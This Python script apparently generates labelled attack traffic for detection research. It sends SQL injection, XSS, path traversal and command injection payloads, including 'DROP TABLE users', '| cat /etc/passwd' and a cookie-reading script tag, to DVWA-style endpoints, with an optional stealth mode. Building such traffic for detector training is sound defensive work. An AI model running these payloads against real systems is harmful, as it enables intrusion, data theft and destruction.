"""Raw httpx scanner — Python attack patterns with no external tooling.

Sends attack-shaped HTTP requests directly via httpx: SQLi in query
params, XSS in headers, path traversal, classic CMSi payloads. No
browser, no JS execution, no beacon callback — exercises the same
no-DOM features path as sqlmap.

Distinct from sqlmap on the wire in two ways:
  - request cadence: tight Python loops without sqlmap's per-target
    state machine, so dt_mean is smaller and more uniform.
  - payload structure: rotates through a small fixed list per endpoint
    instead of sqlmap's mutation engine.

Every request carries X-Allm-* headers because httpx supports a
per-Client headers dict. No need for the proxy schema cache here.
"""

from __future__ import annotations

import os
import random
import sys
import time

import httpx

sys.path.insert(0, "/app/shared")
from manifest import build_payload, headers_for, record_provenance_httpx  # noqa: E402
from target_guard import get_target  # noqa: E402

LABEL = "raw_httpx"
TARGET = get_target()
TARGET_APP = os.environ.get("ALLM_TARGET_APP", "dvwa").strip().lower()
SECURITY_LEVEL = os.environ.get("DVWA_SECURITY_LEVEL", "low")
SESSIONS = int(os.environ.get("ALLM_SESSIONS", "3"))
STEALTH = os.environ.get("ALLM_STEALTH", "false").strip().lower() in (
    "1", "true", "yes",
)

SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "'; DROP TABLE users--",
    "1 UNION SELECT user,password FROM users--",
    "1' AND SLEEP(2)--",
    "1' OR 1=1--",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>",
]
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
CMDI_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "& dir",
    "`whoami`",
]

PROBE_PATHS = [
    ("/vulnerabilities/sqli/", "id", SQLI_PAYLOADS),
    ("/vulnerabilities/xss_r/", "name", XSS_PAYLOADS),
    ("/vulnerabilities/exec/", "ip", CMDI_PAYLOADS),
    ("/vulnerabilities/fi/", "page", TRAVERSAL_PAYLOADS),
    ("/", "q", SQLI_PAYLOADS),
    ("/search", "q", SQLI_PAYLOADS),
    ("/api/users", "id", SQLI_PAYLOADS),
]


def run_session(target: str, payload_template: dict) -> int:
    headers = headers_for(payload_template)
    headers.setdefault("User-Agent", "python-httpx/1.0")
    n_req = 0
    with httpx.Client(
        base_url=target, headers=headers, timeout=10.0,
        follow_redirects=False,
    ) as client:
        try:
            client.head("/")
            n_req += 1
        except httpx.HTTPError:
            pass
        record_provenance_httpx(client, target, payload_template)
        for path, param, payloads in PROBE_PATHS:
            picks = (payloads[:1] if STEALTH
                     else random.sample(payloads, k=min(3, len(payloads))))
            for p in picks:
                try:
                    client.get(path, params={param: p})
                    n_req += 1
                except httpx.HTTPError:
                    continue
                if STEALTH:
                    time.sleep(random.uniform(1.5, 4.0))
    return n_req


def main() -> int:
    mode = "stealth" if STEALTH else "fast"
    print(f"[{LABEL}] target={TARGET} target_app={TARGET_APP} "
          f"mode={mode} sessions={SESSIONS}", flush=True)
    for i in range(SESSIONS):
        t0 = time.time()
        payload = build_payload(
            klass="agent", family=LABEL, target_app=TARGET_APP,
            security_level=SECURITY_LEVEL, stealth=STEALTH,
            generator="raw_httpx", generator_version="0.1.0",
            generator_config={
                "engine": "httpx", "probes": [p[0] for p in PROBE_PATHS],
                "stealth": STEALTH,
            },
        )
        n_req = run_session(TARGET, payload)
        print(f"[{LABEL}] session {i + 1}/{SESSIONS} requests={n_req} "
              f"took={time.time() - t0:.1f}s", flush=True)
    print(f"[{LABEL}] done", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
